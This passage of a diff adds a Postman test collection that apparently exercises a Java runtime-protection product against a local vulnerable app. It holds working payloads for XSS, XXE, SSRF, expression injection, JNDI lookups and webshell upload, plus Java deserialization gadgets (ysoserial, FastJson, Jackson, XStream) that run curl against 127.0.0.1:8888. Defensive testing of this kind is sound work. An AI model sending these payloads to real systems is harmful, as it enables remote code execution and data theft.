+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "str",
+									"value": "<script>alert(document.cookie)</script>",
+									"type": "text"
+								}
+							]
+						},
+						"url": "http://localhost:8000/XSS/post/xss.do"
+					},
+					"response": []
+				},
+				{
+					"name": "Cookie请求",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Cookie",
+								"value": "str=<script>alert(document.cookie)</script>",
+								"type": "text"
+							}
+						],
+						"url": "http://localhost:8000/XSS/cookie/xss.do"
+					},
+					"response": []
+				},
+				{
+					"name": "Header请求",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "str",
+								"value": "<script>alert(document.cookie)</script>",
+								"type": "text"
+							}
+						],
+						"url": "http://localhost:8000/XSS/header/xss.do"
+					},
+					"response": []
+				},
+				{
+					"name": "JSON请求",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\"config\":[{\"id\":\"<script>alert(document.cookie)</script>\"}]}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://localhost:8000/XSS/json/xss.do"
+					},
+					"response": []
+				},
+				{
+					"name": "Form请求",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "formdata",
+							"formdata": [
+								{
+									"key": "str",
+									"value": "<script>alert(document.cookie)</script>",
+									"type": "text"
+								}
+							]
+						},
+						"url": "http://localhost:8000/XSS/post/xss.do"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "05. 表达式执行",
+			"item": [
+				{
+					"name": "Ognl",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\"exp\": \"new java.io.File('/usr').list()\"}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://localhost:8000/Expression/ongl.do"
+					},
+					"response": []
+				},
+				{
+					"name": "SpEL",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\"exp\": \"new java.io.File('/usr').list()\"}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://localhost:8000/Expression/spEL.do"
+					},
+					"response": []
+				},
+				{
+					"name": "Mvel2",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\"exp\": \"new java.io.File('/usr').list()\"}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://localhost:8000/Expression/mvel.do"
+					},
+					"response": []
+				},
+				{
+					"name": "Struts2",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8000/rasp.action?redirect:https://www.baidu.com/",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "8000",
+							"path": [
+								"rasp.action"
+							],
+							"query": [
+								{
+									"key": "redirect:https://www.baidu.com/",
+									"value": null
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "06. WebShell",
+			"item": [
+				{
+					"name": "WebShell",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "chopper",
+									"value": "A",
+									"type": "text"
+								},
+								{
+									"key": "z0",
+									"value": "UTF-8",
+									"type": "text"
+								}
+							]
+						},
+						"url": "http://localhost:8000/modules/webshell/Customize.jsp"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "07. 文件上传",
+			"item": [
+				{
+					"name": "SpringMVC文件上传",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "formdata",
+							"formdata": [
+								{
+									"key": "dir",
+									"value": "/Users/yz/IdeaProjects/javaweb-vuln/vuln-struts2/target/vuln-struts2",
+									"type": "text"
+								},
+								{
+									"key": "file",
+									"type": "file",
+									"src": "/Users/yz/Documents/shell/=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?="
+								}
+							]
+						},
+						"url": "http://localhost:8000/FileUpload/upload.do"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "08. JNI防御",
+			"item": [
+				{
+					"name": "JNI",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "cmd",
+									"value": "pwd",
+									"type": "text"
+								},
+								{
+									"key": "file",
+									"value": "libcmd.jnilib",
+									"type": "text"
+								}
+							]
+						},
+						"url": "http://localhost:8000/modules/jni/loadlibrary.jsp"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "09. Java反序列化",
+			"item": [
+				{
+					"name": "Java反序列化",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": "http://localhost:8000/Deserialization/readObject.do"
+					},
+					"response": []
+				},
+				{
+					"name": "Java反序列化",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\"rememberMe\": \"rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAFmN1cmwgbG9jYWxob3N0Ojg4ODgvb2t0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4\"}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://localhost:8000/Deserialization/readObject.do"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "10. 扫描器",
+			"item": [
+				{
+					"name": "Sqlmap",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "User-Agent",
+								"value": "sqlmap/1.6.3.20#dev (https://sqlmap.org)",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\"name\": \"test\"}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://localhost:8000/Test/test.do"
+					},
+					"response": []
+				},
+				{
+					"name": "sqlmap",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "User-Agent",
+								"value": "sqlmap/1.6.3.20#dev (https://sqlmap.org)",
+								"type": "text"
+							}
+						],
+						"url": {
+							"raw": "http://localhost:8000/Test/test.do?name=test",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "8000",
+							"path": [
+								"Test",
+								"test.do"
+							],
+							"query": [
+								{
+									"key": "name",
+									"value": "test"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "11. XXE",
+			"item": [
+				{
+					"name": "Xerces",
+					"item": [
+						{
+							"name": "GET请求",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://localhost:8000/XXE/get/xerces.do?xml=<!DOCTYPE+test+%5b<!ELEMENT+test+ANY+><!ENTITY+title+SYSTEM+\"file%3a%2f%2f%2f%2f%2f%2f%2fusr\"+>%5d><article><title>%26title%3b<%2ftitle><%2farticle>",
+									"protocol": "http",
+									"host": [
+										"localhost"
+									],
+									"port": "8000",
+									"path": [
+										"XXE",
+										"get",
+										"xerces.do"
+									],
+									"query": [
+										{
+											"key": "xml",
+											"value": "<!DOCTYPE+test+%5b<!ELEMENT+test+ANY+><!ENTITY+title+SYSTEM+\"file%3a%2f%2f%2f%2f%2f%2f%2fusr\"+>%5d><article><title>%26title%3b<%2ftitle><%2farticle>"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "xml",
+											"value": "<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/XXE/post/xerces.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Cookie请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Cookie",
+										"value": "xml=<!DOCTYPE%0Atest%0A%5b<!ELEMENT%0Atest%0AANY%0A><!ENTITY%0Atitle%0ASYSTEM%0A%22file%3a%2f%2f%2f%2f%2f%2f%2fusr%22%0A>%5d><article><title>%26title%3b<%2ftitle><%2farticle>",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/XXE/cookie/xerces.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Header请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "xml",
+										"value": "<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/XXE/header/xerces.do"
+							},
+							"response": []
+						},
+						{
+							"name": "JSON请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\"root\":{\"xml\":\"<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>\"}}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": "http://localhost:8000/XXE/json/xerces.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Form请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "formdata",
+									"formdata": [
+										{
+											"key": "xml",
+											"value": "<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/XXE/post/xerces.do"
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "Dom4j",
+					"item": [
+						{
+							"name": "GET请求",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://localhost:8000/XXE/get/dom4j.do?xml=<!DOCTYPE+test+%5b<!ELEMENT+test+ANY+><!ENTITY+title+SYSTEM+\"file%3a%2f%2f%2f%2f%2f%2f%2fusr\"+>%5d><article><name>%26title%3b<%2fname><%2farticle>",
+									"protocol": "http",
+									"host": [
+										"localhost"
+									],
+									"port": "8000",
+									"path": [
+										"XXE",
+										"get",
+										"dom4j.do"
+									],
+									"query": [
+										{
+											"key": "xml",
+											"value": "<!DOCTYPE+test+%5b<!ELEMENT+test+ANY+><!ENTITY+title+SYSTEM+\"file%3a%2f%2f%2f%2f%2f%2f%2fusr\"+>%5d><article><name>%26title%3b<%2fname><%2farticle>"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "xml",
+											"value": "<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/XXE/post/dom4j.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Cookie请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Cookie",
+										"value": "xml=<!DOCTYPE%0Atest%0A%5b<!ELEMENT%0Atest%0AANY%0A><!ENTITY%0Atitle%0ASYSTEM%0A%22file%3a%2f%2f%2f%2f%2f%2f%2fusr%22%0A>%5d><article><title>%26title%3b<%2ftitle><%2farticle>",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/XXE/cookie/xerces.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Header请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "xml",
+										"value": "<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/XXE/header/dom4j.do"
+							},
+							"response": []
+						},
+						{
+							"name": "JSON请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\"root\":{\"xml\":\"<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>\"}}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": "http://localhost:8000/XXE/json/dom4j.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Form请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "formdata",
+									"formdata": [
+										{
+											"key": "xml",
+											"value": "<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/XXE/post/dom4j.do"
+							},
+							"response": []
+						}
+					]
+				}
+			]
+		},
+		{
+			"name": "12. SSRF",
+			"item": [
+				{
+					"name": "URLConnection",
+					"item": [
+						{
+							"name": "GET请求",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://localhost:8000/SSRF/get/httpConnection.do?url=https://www.baidu.com",
+									"protocol": "http",
+									"host": [
+										"localhost"
+									],
+									"port": "8000",
+									"path": [
+										"SSRF",
+										"get",
+										"httpConnection.do"
+									],
+									"query": [
+										{
+											"key": "url",
+											"value": "https://www.baidu.com"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "url",
+											"value": "https://www.baidu.com",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/SSRF/post/httpConnection.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Cookie请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Cookie",
+										"value": "url=https://www.baidu.com",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/SSRF/cookie/httpConnection.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Header请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "url",
+										"value": "https://www.baidu.com",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/SSRF/header/httpConnection.do"
+							},
+							"response": []
+						},
+						{
+							"name": "JSON请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\"root\": {\"url\":\"https://www.baidu.com\"}}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": "http://localhost:8000/SSRF/json/httpConnection.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Form请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "formdata",
+									"formdata": [
+										{
+											"key": "url",
+											"value": "https://www.baidu.com",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/SSRF/post/httpConnection.do"
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "OkHttp3",
+					"item": [
+						{
+							"name": "GET请求",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://localhost:8000/SSRF/get/okHttp3.do?url=https://www.baidu.com",
+									"protocol": "http",
+									"host": [
+										"localhost"
+									],
+									"port": "8000",
+									"path": [
+										"SSRF",
+										"get",
+										"okHttp3.do"
+									],
+									"query": [
+										{
+											"key": "url",
+											"value": "https://www.baidu.com"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "url",
+											"value": "https://www.baidu.com",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/SSRF/post/okHttp3.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Cookie请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Cookie",
+										"value": "url=https://www.baidu.com",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/SSRF/cookie/okHttp3.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Header请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "url",
+										"value": "https://www.baidu.com",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/SSRF/header/okHttp3.do"
+							},
+							"response": []
+						},
+						{
+							"name": "JSON请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\"root\": {\"url\":\"https://www.baidu.com\"}}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": "http://localhost:8000/SSRF/json/okHttp3.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Form请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "formdata",
+									"formdata": [
+										{
+											"key": "url",
+											"value": "https://www.baidu.com",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/SSRF/post/okHttp3.do"
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "HttpClient",
+					"item": [
+						{
+							"name": "GET请求",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://localhost:8000/SSRF/get/httpClient.do?url=https://www.baidu.com",
+									"protocol": "http",
+									"host": [
+										"localhost"
+									],
+									"port": "8000",
+									"path": [
+										"SSRF",
+										"get",
+										"httpClient.do"
+									],
+									"query": [
+										{
+											"key": "url",
+											"value": "https://www.baidu.com"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "url",
+											"value": "https://www.baidu.com",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/SSRF/post/httpClient.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Cookie请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Cookie",
+										"value": "url=https://www.baidu.com",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/SSRF/cookie/httpClient.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Header请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "url",
+										"value": "https://www.baidu.com",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/SSRF/header/httpClient.do"
+							},
+							"response": []
+						},
+						{
+							"name": "JSON请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\"root\": {\"url\":\"https://www.baidu.com\"}}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": "http://localhost:8000/SSRF/json/httpClient.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Form请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "formdata",
+									"formdata": [
+										{
+											"key": "url",
+											"value": "https://www.baidu.com",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/SSRF/post/httpClient.do"
+							},
+							"response": []
+						}
+					]
+				}
+			]
+		},
+		{
+			"name": "13. FastJson反序列化",
+			"item": [
+				{
+					"name": "FastJson",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "json",
+									"value": "{\"@type\":\"javax.swing.JEditorPane\",\"page\": \"http://127.0.0.1:8888\"}",
+									"type": "text"
+								}
+							]
+						},
+						"url": "http://localhost:8000/FastJson/fastJsonParseObject.do"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "14. Jackson反序列化",
+			"item": [
+				{
+					"name": "Jackson",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "json",
+									"value": "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://127.0.0.1:8888/~/test\"}]",
+									"type": "text"
+								}
+							]
+						},
+						"url": "http://localhost:8000/Jackson/readValue.do"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "15. XStream反序列化",
+			"item": [
+				{
+					"name": "XStream",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"xml\": \"<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'><dataHandler><dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'><contentType>text/plain</contentType><is class='java.io.SequenceInputStream'><e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'><iterator class='javax.imageio.spi.FilterIterator'><iter class='java.util.ArrayList$Itr'><cursor>0</cursor><lastRet>-1</lastRet><expectedModCount>1</expectedModCount><outer-class><java.lang.ProcessBuilder><command><string>curl</string><string>127.0.0.1:8888</string></command></java.lang.ProcessBuilder></outer-class></iter><filter class='javax.imageio.ImageIO$ContainsFilter'><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>start</name></filter><next/></iterator><type>KEYS</type></e><in class='java.io.ByteArrayInputStream'><buf></buf><pos>0</pos><mark>0</mark><count>0</count></in></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><string>test</string></entry></map>\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://localhost:8000/XStream/xStream.do"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "16. 虚拟补丁",
+			"item": [
+				{
+					"name": "文件读取补丁",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\"root\": {\"file\": \"/etc\", \"suffix\": \"ntp.conf\"}}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://localhost:8000/Patch/readFileTest.do"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "17. IP黑名单",
+			"item": [
+				{
+					"name": "IP黑名单",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": "http://10.10.99.2:8000/Blacklist/blacklist.do"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "18. URL黑名单",
+			"item": [
+				{
+					"name": "URL黑名单",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": "http://10.10.99.2:8000/Blacklist/url.do"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "19. URL白名单",
+			"item": [
+				{
+					"name": "URL白名单",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://10.10.99.2:8000/Whitelist/url.do?xss=%3Cscript%3Ealert(%2Fxss%2F)%3B%3C%2Fscript%3E",
+							"protocol": "http",
+							"host": [
+								"10",
+								"10",
+								"99",
+								"2"
+							],
+							"port": "8000",
+							"path": [
+								"Whitelist",
+								"url.do"
+							],
+							"query": [
+								{
+									"key": "xss",
+									"value": "%3Cscript%3Ealert(%2Fxss%2F)%3B%3C%2Fscript%3E"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "20.  内存型后⻔",
+			"item": []
+		},
+		{
+			"name": "21. JNDI",
+			"item": [
+				{
+					"name": "Lookup",
+					"item": [
+						{
+							"name": "GET请求",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://localhost:8000/JNDI/get/lookup.do?url=ldap://127.0.0.1:8888/test",
+									"protocol": "http",
+									"host": [
+										"localhost"
+									],
+									"port": "8000",
+									"path": [
+										"JNDI",
+										"get",
+										"lookup.do"
+									],
+									"query": [
+										{
+											"key": "url",
+											"value": "ldap://127.0.0.1:8888/test"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "url",
+											"value": "ldap://127.0.0.1:8888/test",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/JNDI/post/lookup.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Cookie请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Cookie",
+										"value": "url=ldap://127.0.0.1:8888/test",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/JNDI/cookie/lookup.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Header请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "url",
+										"value": "ldap://127.0.0.1:8888/test",
+										"type": "text"
+									}
+								],
